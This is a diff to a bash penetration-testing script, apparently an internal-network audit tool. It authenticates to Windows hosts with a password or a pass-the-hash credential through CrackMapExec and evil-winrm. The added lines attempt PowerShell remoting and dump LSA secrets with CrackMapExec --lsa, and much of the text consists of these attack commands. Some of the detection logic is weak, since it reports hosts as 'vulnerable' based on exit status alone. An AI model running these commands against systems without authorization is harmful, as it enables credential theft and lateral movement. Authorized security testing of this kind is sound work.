@@ -79,9 +79,9 @@ function test_ip() {
     echo "Checking $ip with CrackMapExec"
     # Check if shares are accessible
     if [ -n "$HASH" ]; then
-        crackmapexec smb $ip -u $USER -H $HASH --shares --no-bruteforce | grep -q "SMBv2.1" && echo "$ip is vulnerable to SMB shares enumeration"
+        TERM=dumb crackmapexec smb $ip -u $USER -H $HASH --shares --no-bruteforce > /dev/null 2>&1 && echo "$ip is vulnerable to SMB shares enumeration"
     else
-        crackmapexec smb $ip -u $USER -p $PASS --shares --no-bruteforce | grep -q "SMBv2.1" && echo "$ip is vulnerable to SMB shares enumeration"
+        TERM=dumb crackmapexec smb $ip -u $USER -p $PASS --shares --no-bruteforce > /dev/null 2>&1 && echo "$ip is vulnerable to SMB shares enumeration"
     fi
 
     echo "Checking $ip with psexec.py"
@@ -122,6 +122,22 @@ function test_ip() {
         timeout 5s evil-winrm -i $ip -u $USER -H $HASH -s | grep -q "WinRM" && echo "$ip is vulnerable to evil-winrm"
     else
         timeout 5s evil-winrm -i $ip -u $USER -p $PASS -s | grep -q "WinRM" && echo "$ip is vulnerable to evil-winrm"
+    fi
+
+    echo "Checking $ip with PowerShell remoting"
+    # Attempt to connect with PowerShell remoting
+    if [ -n "$HASH" ]; then
+        timeout 5s evil-winrm -i $ip -u $USER -H $HASH -s | grep -q "PowerShell" && echo "$ip is vulnerable to PowerShell remoting"
+    else
+        timeout 5s evil-winrm -i $ip -u $USER -p $PASS -s | grep -q "PowerShell" && echo "$ip is vulnerable to PowerShell remoting"
+    fi
+
+    echo "Checking $ip with CrackMapExec LSA Dump"
+    # Attempt to dump LSA secrets with CrackMapExec
+    if [ -n "$HASH" ]; then
+        TERM=dumb crackmapexec smb $ip -u $USER -H $HASH --lsa > /dev/null 2>&1 && echo "$ip is vulnerable to LSA secrets dumping"
+    else
+        TERM=dumb crackmapexec smb $ip -u $USER -p $PASS --lsa > /dev/null 2>&1 && echo "$ip is vulnerable to LSA secrets dumping"
     fi
 }
 
